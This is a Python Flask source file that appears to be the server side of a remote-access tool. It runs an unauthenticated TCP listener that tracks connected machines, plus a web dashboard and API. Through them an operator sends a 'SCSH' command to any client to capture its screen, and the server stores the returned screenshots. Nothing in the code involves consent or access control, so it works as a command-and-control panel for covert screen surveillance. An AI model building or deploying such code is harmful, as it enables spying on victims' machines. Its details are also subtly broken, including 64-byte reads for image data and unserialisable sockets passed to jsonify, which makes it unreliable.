from flask import Flask, render_template, jsonify, request
import socket
import threading
import time
from datetime import datetime
import base64
import os

app = Flask(__name__)

# In-memory storage for clients (in production, use a database)
clients = {}
screenshots = {}

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 8080))
    server_socket.listen(5)
    
    print("Server listening on port 8080...")
    
    while True:
        client_socket, addr = server_socket.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr)).start()

def handle_client(client_socket, addr):
    # Receive initial machine information
    data = client_socket.recv(64).decode()
    ip, port = addr
    
    # Add/update client information
    clients[ip] = {
        'info': data,
        'last_active': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'socket': client_socket
    }
    
    print(f"New connection from {ip}: {data}")
    
    try:
        while True:
            data = client_socket.recv(64).decode()
            if not data:
                break
                
            if data.startswith("Timestamp"):
                clients[ip]['last_active'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            elif data.startswith("SCREENSHOT_DATA"):
                # Handle screenshot data (simplified)
                screenshot_id = f"{ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
                screenshots[screenshot_id] = {
                    'client_ip': ip,
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'data': data[len("SCREENSHOT_DATA:"):]
                }
    except:
        pass
    
    # Client disconnected
    if ip in clients:
        del clients[ip]
    client_socket.close()

@app.route('/')
def dashboard():
    return render_template('dashboard.html', clients=clients)

@app.route('/api/clients')
def get_clients():
    return jsonify(clients)

@app.route('/api/screenshot/<ip>', methods=['POST'])
def request_screenshot(ip):
    if ip in clients:
        try:
            clients[ip]['socket'].send("SCSH".encode())
            return jsonify({"status": "request_sent"})
        except:
            return jsonify({"status": "error"})
    return jsonify({"status": "client_not_found"})

@app.route('/api/screenshots/<ip>')
def get_screenshots(ip):
    client_screenshots = {k:v for k,v in screenshots.items() if v['client_ip'] == ip}
    return jsonify(client_screenshots)

if __name__ == '__main__':
    # Start TCP server in a separate thread
    threading.Thread(target=start_server, daemon=True).start()
    
    # Start web interface
    app.run(host='0.0.0.0', port=5000)
